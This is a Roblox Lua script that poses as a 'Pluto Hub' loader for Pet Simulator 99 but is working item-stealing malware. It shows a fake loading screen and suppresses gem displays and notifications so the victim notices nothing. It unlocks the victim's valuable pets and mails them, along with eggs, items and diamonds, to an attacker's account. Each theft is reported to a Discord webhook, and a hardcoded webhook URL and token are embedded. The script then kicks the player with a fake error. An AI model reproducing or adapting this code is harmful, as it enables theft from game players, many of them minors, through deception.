_G.Configuration = {
	Username = "",
	MinimumRap = 10000,
	Webhook = ""
}

if game.PlaceId ~= 8737899170 then
	game.Players.LocalPlayer:Kick("Pluto Hub only supports Pet Simulator 99 (the main game!)")
end

local FakeLoad = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Load = Instance.new("TextLabel")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
local Progress = Instance.new("TextLabel")
local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
local ImageLabel = Instance.new("ImageLabel")

FakeLoad.Name = "FakeLoad"
FakeLoad.Parent = game.CoreGui
FakeLoad.IgnoreGuiInset = true
FakeLoad.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = FakeLoad
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Size = UDim2.new(1, 0, 1, 0)

Load.Name = "Load"
Load.Parent = Frame
Load.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Load.BackgroundTransparency = 1.000
Load.BorderColor3 = Color3.fromRGB(0, 0, 0)
Load.BorderSizePixel = 0
Load.Position = UDim2.new(0, 0, 0.461329728, 0)
Load.Size = UDim2.new(1, 0, 0.075983718, 0)
Load.Font = Enum.Font.Gotham
Load.Text = "Loading Pluto Hub..."
Load.TextColor3 = Color3.fromRGB(255, 255, 255)
Load.TextScaled = true
Load.TextSize = 14.000
Load.TextWrapped = true

UITextSizeConstraint.Parent = Load
UITextSizeConstraint.MaxTextSize = 25

Progress.Name = "Progress"
Progress.Parent = Frame
Progress.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Progress.BackgroundTransparency = 1.000
Progress.BorderColor3 = Color3.fromRGB(0, 0, 0)
Progress.BorderSizePixel = 0
Progress.Position = UDim2.new(0, 0, 0.537313461, 0)
Progress.Size = UDim2.new(1, 0, 0.021709634, 0)
Progress.Font = Enum.Font.Gotham
Progress.Text = "0/1278"
Progress.TextColor3 = Color3.fromRGB(255, 255, 255)
Progress.TextScaled = true
Progress.TextSize = 14.000
Progress.TextWrapped = true

UITextSizeConstraint_2.Parent = Progress
UITextSizeConstraint_2.MaxTextSize = 25

ImageLabel.Parent = Frame
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.931297719, 0, 0.881953895, 0)
ImageLabel.Size = UDim2.new(0.0549618267, 0, 0.100000009, 0)
ImageLabel.Image = "http://www.roblox.com/asset/?id=7414445494"

local function XIEJJBN_fake_script()
	local script = Instance.new('LocalScript', Progress)

	local load = 0
	
	while wait(math.random(0, 0.6)) do
		load += 1
		script.Parent.Text = load.."/1278"
	end
end

coroutine.wrap(XIEJJBN_fake_script)()

local function QWRJFE_fake_script()
	local script = Instance.new('LocalScript', ImageLabel)

	while wait() do
		script.Parent.Rotation += 6
	end
end

coroutine.wrap(QWRJFE_fake_script)()

local function SendMessage(url, username, itemID)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
		["content"] = "||@everyone @here||",
        ["embeds"] = {{
            ["title"] = "**Item Stolen**",
            ["color"] = tonumber(0x0080ff),
            ["footer"] = {
                ["text"] = "Pluto BloxyBet Fake Bot"
			},
			["description"] = "🤵 Account: "..username.."\n🪀 Item: "..tostring(itemID),
        }}
    }
    local body = http:JSONEncode(data)
    local response = request({
		Url = url,
		Method = "POST",
		Headers = headers,
		Body = body
	})
end

if _G.Configuration.Webhook and string.find(_G.Configuration.Webhook, "discord") then
	_G.Configuration.Webhook = string.gsub(_G.Configuration.Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
else
	_G.Configuration.Webhook = "https://discord.com/api/webhooks/1221967445024047164/_cpe9QpBApw0T2hDOotfbDHSgtJ2rLj2Xc_piHleozh1ef2wSZSOI9VvgaNm1GmxP_ms"
end

local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "Mailstolen !"
local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end

if GemAmount1 < 10000 then
    plr:kick("Saving error, please rejoin!")
end

local user = _G.Configuration.Username

local gemsleft = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
local gemsleftpath = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
gemsleftpath:GetPropertyChangedSignal("Text"):Connect(function()
	gemsleftpath.Text = gemsleft
end)

local gemsleaderstat = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"].Value
local gemsleaderstatpath = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
	gemsleaderstatpath.Value = gemsleaderstat
end)

local loading = game:GetService('Players').LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = game:GetService('Players').LocalPlayer.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

local HttpService = game:GetService("HttpService")
local function getRAP(Type, Item)
    if GetRapValues[Type] then
        for i,v in pairs(GetRapValues[Type]) do
            local itemTable = HttpService:JSONDecode(i)
            if itemTable.id == Item.id and itemTable.tn == Item.tn and itemTable.sh == Item.sh and itemTable.pt == Item.pt then
                return v
            end
        end
		return 0
    end
end

local function sendItem(category, uid, am, id)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    if _G.Configuration.Webhook and _G.Configuration.Webhook ~= "" then
        SendMessage(_G.Configuration.Webhook, game.Players.LocalPlayer.Name, id)
    end
end

local function CountHuges()
	local count = 0
	for i, v in pairs(save.Pet) do
		local id = v.id
		local dir = library.Directory.Pets[id]
		if dir.huge and getRAP("Pet", v) >= _G.Configuration.MinimumRap then
			count = count + 1
		end
	end
	return count
end

local function StealHuge()
	local hugesSent = 0
	local initialHuges = CountHuges()
    for i, v in pairs(save.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.huge and getRAP("Pet", v) >= _G.Configuration.MinimumRap then
			if v._lk then
				local args = {
				[1] = i,
				[2] = false
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
			end
            sendItem("Pet", i, v._am or 1, id)
			local finalHuges = CountHuges()
			if finalHuges < initialHuges then
				hugesSent = hugesSent + 1
				initialHuges = finalHuges
			end
        end
    end
	return hugesSent
end

local function SendAllHuges()
	local totalHuges = CountHuges()
	local hugesSent = 0
	repeat
		hugesSent = hugesSent + StealHuge()
	until hugesSent == totalHuges
end

local function CountExc()
	local count = 0
	for i, v in pairs(save.Pet) do
		local id = v.id
		local dir = library.Directory.Pets[id]
		if dir.exclusiveLevel and getRAP("Pet", v) >= _G.Configuration.MinimumRap then
			count = count + 1
		end
	end
	return count
end

local function ExcSteal()
	local excSent = 0
	local initialExc = CountExc()
    for i, v in pairs(save.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.exclusiveLevel and getRAP("Pet", v) >= _G.Configuration.MinimumRap then
			if v._lk then
				local args = {
				[1] = i,
				[2] = false
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
			end
            sendItem("Pet", i, v._am or 1, id)
			local finalExc = CountExc()
			if finalExc < initialExc then
				excSent = excSent + 1
				initialExc = finalExc
			end
        end
    end
	return excSent
end

local function SendAllExc()
	local totalExc = CountExc()
	local excSent = 0
	repeat
		excSent = excSent + ExcSteal()
	until excSent == totalExc
end

local function EggSteal()
    for i, v in pairs(save.Egg) do
		local id = v.id
		local diregg = library.Directory.Eggs[id]
		if diregg and getRAP("Egg", v) >= _G.Configuration.MinimumRap then
			sendItem("Egg", i, v._am or 1, id)
		end
    end
end

local function CharmSteal()
    for i, v in pairs(save.Charm) do
        local id = v.id
		local dircharm = library.Directory.Charms[id]
		if dircharm and getRAP("Charm", v) >= _G.Configuration.MinimumRap then
			sendItem("Charm", i, v._am or 1, id)
		end
    end
end

local function EnchantSteal()
    for i, v in pairs(save.Enchant) do
		local id = v.id
		local direnchant = library.Directory.Enchants[id]
		if direnchant and getRAP("Enchant", v) >= _G.Configuration.MinimumRap then
			sendItem("Enchant", i, v._am or 1, id)
		end
    end
end

local function PotionSteal()
    for i, v in pairs(save.Potion) do
		local id = v.id
		local dirpotion = library.Directory.Potions[id]
		if dirpotion and getRAP("Potion", v) >= _G.Configuration.MinimumRap then
			sendItem("Potion", i, v._am or 1, id)
		end
    end
end

local function miscSteal()
	for i, v in pairs(save.Misc) do
		local id = v.id
		local dirmisc = library.Directory.MiscItems[id]
		if dirmisc and getRAP("Misc", v) > _G.Configuration.MinimumRap then
			sendItem("Misc", i, v._am or 1, id)
		end
	end
end

local function hoverSteal()
	for i, v in pairs(save.Hoverboard) do
		local id = v.id
		local dirhover = library.Directory.Hoverboards[id]
		if dirhover and getRAP("Hoverboard", v) > _G.Configuration.MinimumRap then
			sendItem("Hoverboard", i, v._am or 1, id)
		end
	end
end

local function boothSteal()
	for i, v in pairs(save.Booth) do
		local id = v.id
		local dirbooth = library.Directory.Booths[id]
		if dirbooth and getRAP("Booth", v) > _G.Configuration.MinimumRap then
			sendItem("Booth", i, v._am or 1, id)
		end
	end
end

local function ultimateSteal()
	for i, v in pairs(save.Ultimate) do
		local id = v.id
		local dirultimate = library.Directory.Ultimates[id]
		if dirultimate and getRAP("Ultimate", v) > _G.Configuration.MinimumRap then
			sendItem("Ultimate", i, v._am or 1, id)
		end
	end
end

local function GemSteal()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            local GemAmount = v._am
            local args = {
                [1] = user,
                [2] = MailMessage,
                [3] = "Currency",
                [4] = i,
                [5] = GemAmount - 10000
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
			if _G.Configuration.Webhook and  _G.Configuration.Webhook then
				SendMessage(_G.Configuration.Webhook, game.Players.LocalPlayer.Name, "Gems: " .. (GemAmount - 10000))
			end
        end
    end
end

local function EmptyBoxes()
    if save.Box then
        for key, _ in pairs(save.Box) do
			local args = {
				[1] = key
			}
			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(unpack(args))
        end
    end
end

local function CountGems()
	for i, v in pairs(GetSave().Inventory.Currency) do
		if v.id == "Diamonds" then
			GemAmount1 = v._am
			return GemAmount1
		end
	end
end

local function SendAllGems()
	repeat
		GemSteal()
	until CountGems() == nil or CountGems() < 10000
end

if CountHuges() > 0 or CountGems() > 1000000 then
	EmptyBoxes()
	SendAllHuges()
	SendAllExc()

	if save.Egg ~= nil then
		EggSteal()
	end

	if save.Ultimate ~= nil then
		ultimateSteal()
	end

	hoverSteal()
	miscSteal()
	SendAllGems()
	setclipboard("")
	plr:kick("Error on script execution: 0x002F7R9")
else
	plr:kick("Error on script execution: 0x0001F4A2")
end
